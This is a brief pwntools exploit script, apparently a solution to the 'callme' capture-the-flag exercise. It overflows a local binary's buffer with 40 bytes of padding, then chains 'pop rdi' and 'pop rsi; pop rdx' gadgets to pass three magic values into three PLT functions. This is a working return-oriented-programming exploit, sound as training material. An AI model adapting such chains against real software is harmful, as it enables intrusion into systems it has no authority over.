from pwn import *

junk = b'A' * 40

p1 = p64(0xdeadbeefdeadbeef)
p2 = p64(0xcafebabecafebabe)
p3 = p64(0xd00df00dd00df00d)

g1 = p64(0x00000000004009a3) # pop rdi ; ret
g2 = p64(0x000000000040093d) # pop rsi ; pop rdx ; ret

call_one = p64(0x00400720) #callme_one@plt
call_two = p64(0x00400740) # --@plt
call_three = p64(0x004006f0) #--@plt

set_param = g1 + p1 + g2 + p2 + p3

payload = junk + set_param + call_one + set_param + call_two + set_param + call_three

p = process('./callme')
p.recvuntil('>')
p.sendline(payload)
p.interactive()